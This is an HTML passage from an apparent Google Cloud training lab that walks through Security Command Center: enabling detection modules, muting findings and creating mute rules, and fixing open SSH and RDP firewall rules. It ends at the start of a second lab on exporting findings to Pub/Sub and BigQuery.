href='https://owasp.org/www-project-top-ten/'><span>OWASP top 10</span></a><span> vulnerabilities.</span></p></li><li><p><strong><span>Container Threat Detection (CTD)</span></strong><span>—Detects the most common container runtime attacks in a Container Optimized OS.</span></p></li><li><p><strong><span>Event Threat Detection (ETD)</span></strong><span>—Provides log-based threat analysis that continuously monitors Google Cloud and Google Workspace logs to scan for potential threats.</span></p></li><li><p><strong><span>Virtual Machine Threat Detection</span></strong><span>—Analyzes memory of VM instances on the level of a Hypervisor and can detect suspicious activities happening in VM memory. Examples are unexpected kernel modules or running crypto-mining software.</span></p></li></ul><ol start='' ><li><p><span>Click on the </span><strong><span>Manage settings</span></strong><span> link for </span><strong><span>Security Health Analytics</span></strong><span>.</span></p></li><li><p><span>Click on the </span><strong><span>Modules</span></strong><span> tab.</span></p></li></ol><p><em><span>Modules</span></em><span> are pre-defined, or custom units of detection logic. As you can see, SCC offers many different types of modules that can help you detect different misconfigurations of resources. SCC makes it easy to enable and disable different types of modules to support your security posture and the resources you are interested in monitoring.</span></p><ol start='' ><li><p><span>In the filter field, type </span><code>VPC_FLOW_LOGS_SETTINGS_NOT_RECOMMENDED</code><span> and press </span><strong><span>Enter</span></strong><span>.</span></p></li><li><p><span>Select </span><strong><span>Enable</span></strong><span> from the </span><strong><span>Status</span></strong><span> dropdown.</span></p></li></ol><p><span>With this enabled, Security Health Analytics checks whether the </span><code>enableFlowLogs</code><span> property of VPC subnetworks is missing or set to false.</span></p><p><strong><span>Note:</span></strong><span> There is a delay until SCC starts scanning resources using the newly enabled module.</span></p><p><span>Now that you are familiar with Security Command Center&#39;s different services and how to configure them, you can explore how to identify and fix a vulnerability with SCC.</span></p><h2 id='task-3-analyze-and-fix-scc-vulnerability-findings'><span>Task 3. Analyze and fix SCC vulnerability findings</span></h2><p><span>In this task, you learn how to manage and mitigate vulnerability findings.</span></p><h3 id='mark-a-finding-as-inactive-to-change-its-state'><span>Mark a finding as INACTIVE to change its state</span></h3><ol start='' ><li><p><span>From the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>), select </span><strong><span>Security &gt; Risk Overview</span></strong><span>.</span></p></li><li><p><span>In the left-hand menu, click on the </span><strong><span>Findings</span></strong><span> tab.</span></p></li><li><p><span>Set the </span><strong><span>Timge range</span></strong><span> selector in the top-right corner to </span><strong><span>All time</span></strong><span>.</span></p></li></ol><p>&nbsp;</p><p><span>Roughly how many findings in total are included in the list?</span></p><ul><li><p><span>50</span></p></li><li><p><span>40</span></p></li><li><p><span>60</span></p></li><li><p><strong><span>70</span></strong></p></li></ul><p><span>Submit</span></p><p>&nbsp;</p><ol start='' ><li><p><span>In the top-left corner of the screen, find the </span><strong><span>Query preview</span></strong><span> window, which contains a filter for sorting through all available findings.</span></p></li></ol><p><span>By default, the </span><strong><span>Findings</span></strong><span> tab displays unmuted findings with a state of </span><strong><span>ACTIVE</span></strong><span>.</span></p><p><span>The two properties </span><em><span>state</span></em><span> and </span><em><span>mute</span></em><span> of every finding define visibility of findings in many filters used for SCC.</span></p><ul><li><p><span>The </span><a href='https://cloud.google.com/security-command-center/docs/reference/rest/v1/organizations.sources.findings#mute'><span>mute</span></a><span> value can be set on findings by the security analyst or it can be set automatically if the analyst does not want to see irrelevant and noisy findings in the SCC interface.</span></p></li><li><p><span>The </span><a href='https://cloud.google.com/security-command-center/docs/reference/rest/v1/organizations.sources.findings#state'><span>state</span></a><span> property indicates whether a finding requires attention and has not been addressed yet, or if it&#39;s been fixed or otherwise addressed and is no longer active.</span></p></li></ul><p><span>A recommended way to manage the lifecycle of findings and hide them is to use the </span><code>mute</code><span> property. Changing the </span><code>state</code><span> property is typically handled by software sources.</span></p><ol start='' ><li><p><span>On the </span><strong><span>Quick filters</span></strong><span> card, select the checkbox associated with the </span><strong><span>Default network</span></strong><span> category.</span></p></li><li><p><span>Notice that the query string in the </span><strong><span>Query preview</span></strong><span> has changed (it now has </span><code>AND category=&quot;DEFAULT_NETWORK&quot;</code><span> attached to it).</span></p></li><li><p><span>In the </span><strong><span>Findings query results</span></strong><span> section, select the checkbox associated with </span><strong><span>Default network</span></strong><span> and select </span><strong><span>More actions</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/2ufrDePg5inKfodUoT2Kib4oE7II7emYn%2BypCC85FjQ%3D" referrerpolicy="no-referrer" alt="More actions icon"><span>) </span><strong><span>&gt; Change active state</span></strong><span>.</span></p></li><li><p><span>Set the state to </span><strong><span>Inactive</span></strong><span> for this finding.</span></p></li></ol><p><span>Now the finding has been deactivated and hidden from the screen because by default only active and unmuted findings are listed.</span></p><h3 id='filter-findings-results-by-applying-a-query'><span>Filter findings results by applying a query</span></h3><ol start='' ><li><p><span>You can reset the </span><strong><span>Findings</span></strong><span> tab view. To do this, select </span><strong><span>Risk Overview</span></strong><span> and then choose </span><strong><span>Findings</span></strong><span> under the SCC header.</span></p></li></ol><p>&nbsp;</p><p><span>Roughly how many findings in total are in the list?</span></p><p>&nbsp;</p><p><span>60</span></p><p>&nbsp;</p><p><span>40</span></p><p>&nbsp;</p><p><span>50</span></p><p>&nbsp;</p><p><span>70</span></p><p>&nbsp;</p><p><span>Submit</span></p><p>&nbsp;</p><ol start='' ><li><p><span>Click the </span><strong><span>Edit query</span></strong><span> button.</span></p></li><li><p><span>Change the query string in the </span><strong><span>Query editor</span></strong><span> to </span><code>category=&quot;DEFAULT_NETWORK&quot;</code><span>.</span></p></li><li><p><span>When you&#39;re finished editing, click the </span><strong><span>Apply</span></strong><span> button.</span></p><p><span>It may take a minute or two for the change to take effect. Once it does, only one finding for </span><strong><span>Default network</span></strong><span> is listed.</span></p></li></ol><p><span>In the left-hand menu under </span><strong><span>Quick filters</span></strong><span>, note that the </span><strong><span>Show inactive</span></strong><span> checkbox is selected. SCC gives you the flexibility to search for active and inactive findings. Now, you can revert the state of this finding.</span></p><ol start='' ><li><p><span>In the </span><strong><span>Findings query results</span></strong><span> section, select the checkbox for </span><strong><span>Default network</span></strong><span> and select </span><strong><span>More actions</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/2ufrDePg5inKfodUoT2Kib4oE7II7emYn%2BypCC85FjQ%3D" referrerpolicy="no-referrer" alt="More actions icon"><span>) </span><strong><span>&gt; Change active state</span></strong><span>.</span></p></li><li><p><span>Set the state for this finding to </span><strong><span>Active</span></strong><span>.</span></p></li></ol><p><span>Findings can be activated and deactivated manually, but they can never be deleted by a user. They are deleted automatically only when a finding has not been refreshed by scanners during a period of 13 months.</span></p><p><span>When a security scanner checks the same finding and does not detect the misconfiguration that kicked off the finding, it marks it as </span><code>INACTIVE</code><span>. If the vulnerability still presents in the system, the finding stays in an </span><code>ACTIVE</code><span> state.</span></p><ol start='' ><li><p><span>Click the </span><strong><span>Clear All</span></strong><span> button next to Quick Filters to reset the findings tab.</span></p></li><li><p><span>In the </span><strong><span>Query preview</span></strong><span> window, click </span><strong><span>Edit Query</span></strong><span>.</span></p></li><li><p><span>Now copy and paste the the following query:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">state="ACTIVE" AND NOT mute="MUTED" AND resource.type="google.compute.Subnetwork"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>When you&#39;re finished editing, click the </span><strong><span>Apply</span></strong><span> button.</span></p></li></ol><p><span>Now all findings related to subnetworks display. For this lab, the default VPC network is created with the </span><code>--subnet-mode=auto</code><span> parameter, so none of its subnets have </span><a href='https://cloud.google.com/vpc/docs/private-google-access'><span>Private Google Access</span></a><span> enabled and all subnets do not write VPC Flow logs.</span></p><h3 id='filter-findings-by-category-and-mute-them'><span>Filter findings by category and mute them</span></h3><p><span>When working in a test environment, you sometimes want to hide certain findings. In this instance, you do not want to see SCC findings about Private Google Access in this network, so you want to mute those findings.</span></p><ol start='' ><li><p><span>In the </span><strong><span>Quick filters</span></strong><span> window, select the category, </span><strong><span>Private google access disabled</span></strong><span>.</span></p></li><li><p><span>In the </span><strong><span>Finding query results</span></strong><span> pane, select the uppermost </span><strong><span>Category</span></strong><span> checkbox so all &quot;Private google access disabled&quot; findings are selected.</span></p></li></ol><p><img src="images\ezC%2BQT7sCf5LgLFrk%2FJDa3AHa7UDld4iTZB%2Bz6%2BeFZY%3D" referrerpolicy="no-referrer" alt="Category checkbox selected"></p><ol start='' ><li><p><span>Select </span><strong><span>More actions</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/2ufrDePg5inKfodUoT2Kib4oE7II7emYn%2BypCC85FjQ%3D" referrerpolicy="no-referrer" alt="More actions icon"><span>) and click the </span><strong><span>Mute options</span></strong><span> button.</span></p></li><li><p><span>In the dropdown, select </span><strong><span>Apply mute override</span></strong><span>. This operation mutes existing findings.</span></p></li><li><p><span>Select </span><strong><span>Risk Overview</span></strong><span> in the left-hand menu and then select </span><strong><span>Findings</span></strong><span> to reset the findings view.</span></p></li></ol><p>&nbsp;</p><p><span>Roughly how many findings in total can you see in the list?</span></p><p>&nbsp;</p><p><span>70</span></p><p>&nbsp;</p><p><span>60</span></p><p>&nbsp;</p><p><span>50</span></p><p>&nbsp;</p><p><span>40</span></p><p>&nbsp;</p><p><span>Submit</span></p><p>&nbsp;</p><p><span>Notice that the </span><strong><span>Private google access disabled</span></strong><span> findings are now muted and no longer display. Muting is a powerful way to filter SCC results and provides you the fine-grained control over your resources and findings you are interested in.</span></p><h3 id='create-a-mute-rule-to-hide-certain-findings'><span>Create a mute rule to hide certain findings</span></h3><p><span>Another misconfiguration of the default network is that VPC Flow Logs are also disabled in the subnets of this network. Since you are working in a test environment, you don&#39;t need VPC Flow Logs enabled.</span></p><p><span>In this section, you mute all existing and all future findings related to this category.</span></p><ol start='' ><li><p><span>In the </span><strong><span>Findings query results</span></strong><span> window, select </span><strong><span>More actions</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/2ufrDePg5inKfodUoT2Kib4oE7II7emYn%2BypCC85FjQ%3D" referrerpolicy="no-referrer" alt="More actions icon"><span>) </span><strong><span>&gt;</span></strong><span> </span><strong><span>Mute options &gt; Manage mute rules</span></strong><span>.</span></p></li><li><p><span>Click the </span><strong><span>Create mute rule</span></strong><span> button.</span></p></li></ol><p><strong><span>Note:</span></strong><span> You can create an SCC configuration that mutes existing and all new findings satisfying the criteria, defined in the </span><strong><span>Finding query</span></strong><span> field. Note that previously you muted existing &quot;Private google access disabled&quot; (PGA) findings.</span></p><p><span>That was a one-time operation and newly detected findings reporting about disabled PGA still appear in SCC. However, if you create a mute rule, you effectively mute all existing and all new findings.</span></p><ol start='' ><li><p><span>In the new window, enter a Mute rule with ID: </span><code>muting-pga-findings</code><span>.</span></p></li><li><p><span>For the mute rule description, enter </span><code>Mute rule for VPC Flow Logs</code><span>.</span></p></li><li><p><span>In the </span><strong><span>Findings query</span></strong><span> filter input field, enter the following filter:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">category="FLOW_LOGS_DISABLED"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Click the </span><strong><span>Save</span></strong><span> button.</span></p></li></ol><p><span>You should get a notification statig that a mute rule has been created.</span></p><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify you&#39;ve completed this objective.</span></p><p><span>Create a mute rule</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><ol start='' ><li><p><span>Now refresh the main SCC Dashboard by selecting </span><strong><span>Findings</span></strong><span> from the left-hand menu.</span></p><p><span>Ensure that you no longer get any </span><strong><span>Private google access disabled</span></strong><span> or </span><strong><span>Flow logs disabled</span></strong><span> findings.</span></p></li></ol><p><strong><span>Note:</span></strong><span> If any of these findings still display, please refresh the browser tab.</span></p><h3 id='create-another-vpc-network-to-test-the-findings-mute-rule'><span>Create another VPC network to test the findings mute rule</span></h3><p><span>In this section, you create one more network with automatically configured subnets to test out the recent modifications to your finding rules.</span></p><ol start='' ><li><p><span>Open a new Cloud Shell session (</span><img src="https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D" referrerpolicy="no-referrer" alt="Activate Cloud Shell icon"><span>) and run the following command to create the network:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute networks create scc-lab-net --subnet-mode=auto</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Note:</span></strong><span> It may take a few minutes for the subnet to be created.</span></p><p><span>Ensure the output you receive is similar to the following.</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Created [https://www.googleapis.com/compute/v1/projects/qwiklabs-gcp-03-c6821aef4c0f/global/networks/SCC-lab-net].</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME: SCC-lab-net</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">SUBNET_MODE: AUTO</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">BGP_ROUTING_MODE: REGIONAL</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">IPV4_RANGE:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">GATEWAY_IPV4:</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 158px;"></div><div class="CodeMirror-gutters" style="display: none; height: 158px;"></div></div></div></pre><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify you&#39;ve completed this objective.</span></p><p><span>Create a network</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><ol start='' ><li><p><span>Close the Cloud Shell window after you have verified the above message.</span></p></li><li><p><span>Refresh the SCC findings window and note the newly created </span><strong><span>Private google access disabled</span></strong><span> finding. However, there are no findings about VPC Flow Logs (this is because of the mute rule you created earlier).</span></p><p><span>Although you created mute rules for VPC Flow Logs, SCC still allows you to view them using the query editor.</span></p></li><li><p><span>Click the </span><strong><span>Edit Query</span></strong><span> button and paste in the following to overwrite the existing query filter text:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">category="FLOW_LOGS_DISABLED"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Click </span><strong><span>Apply</span></strong><span>.</span></p><p><span>Check the </span><strong><span>Findings query results</span></strong><span> window and note that in the </span><strong><span>Resource display name</span></strong><span> column, both the &quot;defaults&quot; and &quot;SCC-lab-net&quot; networks are listed.</span></p></li></ol><p><strong><span>Note:</span></strong><span> If you do not see the default network listed, please make sure that the parameter </span><code>Rows per page</code><span> is set to 100. Also check that the </span><code>Time Range</code><span> parameter is set to the </span><code>All time</code><span> value.</span></p><ol start='' ><li><p><span>In the </span><strong><span>Query preview</span></strong><span> window, click </span><strong><span>Edit Query</span></strong><span>.</span></p></li><li><p><span>Now copy and paste the the following query to overwrite the previous query text:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">state="ACTIVE" AND NOT mute="MUTED"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>When you&#39;re finished editing, click the </span><strong><span>Apply</span></strong><span> button.</span></p><p><span>This shows you the findings you had muted previously.</span></p></li></ol><h3 id='investigate-and-fix-two-findings-with-high-severity'><span>Investigate and fix two findings with high severity.</span></h3><p><span>In this section, you investigate and explore how to fix two findings with high severity.</span></p><ol start='' ><li><p><span>In the </span><strong><span>Quick Filters</span></strong><span> section, scroll down to the </span><strong><span>Severity</span></strong><span> type and select </span><strong><span>High</span></strong><span> from the list of severity options.</span></p></li></ol><p><span>You should see two findings: </span><strong><span>Open RDP port</span></strong><span> and </span><strong><span>Open SSH port</span></strong><span>. They have been initiated because the &quot;default&quot; network contains two firewall rules enabling SSH and RDP traffic to all instances in this network from the whole Internet.</span></p><ol start='' ><li><p><span>In the </span><strong><span>Findings query results</span></strong><span> window, click on the </span><strong><span>Open RDP port</span></strong><span> finding.</span></p></li></ol><p><span>A new window appears, which provides a detailed description of the issue itself, a list of affected resources, and &quot;Next steps&quot; to help you remediate it.</span></p><ol start='' ><li><p><span>In the </span><strong><span>Next steps</span></strong><span> section, click on the link to go to the </span><em><span>firewall rules page</span></em><span>, which opens in a new tab.</span></p></li><li><p><span>Click the </span><strong><span>default-allow-rdp</span></strong><span> firewall rule.</span></p></li><li><p><span>Click </span><strong><span>Edit</span></strong><span>.</span></p></li><li><p><span>Delete the source IP range, </span><code>0.0.0.0/0</code><span>.</span></p></li><li><p><span>Add the following source IP range </span><code>35.235.240.0/20</code><span> and press </span><strong><span>Enter</span></strong><span>.</span></p></li></ol><p><strong><span>Note:</span></strong><span> This range of IP addresses is used for connecting to VM instances securely via Identity Aware Proxy. More information is available on the </span><a href='https://cloud.google.com/iap/docs/using-tcp-forwarding'><span>Using IAP for TCP forwarding</span></a><span> page.</span></p><p><span>Do not change any other parameters!</span></p><ol start='' ><li><p><span>Click </span><strong><span>Save</span></strong><span>.</span></p></li><li><p><span>Once saved, close the browser tab where you edited the firewall rule.</span></p></li><li><p><span>Refresh the SCC findings browser tab.</span></p><p><span>You should now see only one finding with </span><strong><span>High</span></strong><span> severity - </span><strong><span>Open SSH Port</span></strong><span>.</span></p></li></ol><h3 id='update-the-firewall-rules-to-address-a-finding'><span>Update the firewall rules to address a finding</span></h3><ol start='' ><li><p><span>Click on the </span><strong><span>Open SSH port</span></strong><span> finding.</span></p></li><li><p><span>Scroll down to the </span><strong><span>Next steps</span></strong><span> section and click on the link to go to the </span><em><span>firewall rules page</span></em><span>, which opens in a new tab.</span></p></li><li><p><span>Click the </span><strong><span>default-allow-ssh</span></strong><span> firewall rule.</span></p></li><li><p><span>Click </span><strong><span>Edit</span></strong><span>.</span></p></li><li><p><span>Delete the source IP range, </span><code>0.0.0.0/0</code><span>.</span></p></li><li><p><span>Add the following source IP range </span><code>35.235.240.0/20</code><span> and press </span><strong><span>Enter</span></strong><span>.</span></p><p><span>Do not change any other parameters!</span></p></li><li><p><span>Click </span><strong><span>Save</span></strong><span>.</span></p></li><li><p><span>Once saved, close the browser tab where you edited the firewall rule.</span></p></li></ol><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify you&#39;ve completed this objective.</span></p><p><span>Update the firewall rules</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><ol start='' ><li><p><span>Now close the window with an open finding description and refresh the browser window.</span></p><p><span>You should see no findings with </span><strong><span>High</span></strong><span> severity.</span></p></li></ol><h2 id='congratulations-38'><span>Congratulations!</span></h2><p><span>Throughout this lab, you learned how to explore the Security Command Center interface elements, configure SCC settings at the project level, and analyze and fix SCC vulnerability. You have also used SCC to identify and remediate critical security vulnerabilities in your Google Cloud environment.</span></p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><h2 id='lab---analyze-findings-with-security-command-center'><span>LAB - Analyze Findings with Security Command Center</span></h2><p>&nbsp;</p><h2 id='overview-41'><span>Overview</span></h2><p><a href='https://cloud.google.com/security-command-center'><span>Security Command Center</span></a><span> (SCC) is a security monitoring platform that helps users accomplish the following:</span></p><ul><li><p><span>Discover security-related misconfigurations of Google Cloud resources.</span></p></li><li><p><span>Report on active threats in Google Cloud environments.</span></p></li><li><p><span>Fix vulnerabilities across Google Cloud assets.</span></p></li></ul><p><span>In this lab, you learn about Security Command Center by exploring the service’s analyzed assets and export features.</span></p><h3 id='objectives-29'><span>Objectives</span></h3><p><span>In this lab, you learn how to perform the following tasks:</span></p><ul><li><p><span>Create a continuous export pipeline to Pub/Sub.</span></p></li><li><p><span>Export and analyze SCC findings in a BigQuery table.</span></p></li></ul><h3 id='prerequisites-3'><span>Prerequisites</span></h3><p><span>It is recommended that you&#39;re familiar with the following before starting this lab:</span></p><ul><li><p><span>Cloud computing concepts.</span></p></li><li><p><span>Google Cloud console.</span></p></li><li><p><span>The </span><a href='https://cloud.google.com/security-command-center/docs/finding-severity-classifications'><span>severity classifications for findings</span></a><span> (this is recommended but not required).</span></p></li><li><p><span>Pub/Sub and BigQuery (recommended but not required).</span></p></li></ul><h2 id='setup-and-requirements-36'><span>Setup and requirements</span></h2><h3 id='before-you-click-the-start-lab-button-25'><span>Before you click the Start Lab button</span></h3><p><span>Read these instructions. Labs are timed and you cannot pause them. The timer, which starts when you click </span><strong><span>Start Lab</span></strong><span>, shows how long Google Cloud resources are made available to you.</span></p><p><span>This hands-on lab lets you do the lab activities in a real cloud environment, not in a simulation or demo environment. It does so by giving you new, temporary credentials you use to sign in and access Google Cloud for the duration of the lab.</span></p><p><span>To complete this lab, you need:</span></p><ul><li><p><span>Access to a standard internet browser (Chrome browser recommended).</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use an Incognito (recommended) or private browser window to run this lab. This prevents conflicts between your personal account and the student account, which may cause extra charges incurred to your personal 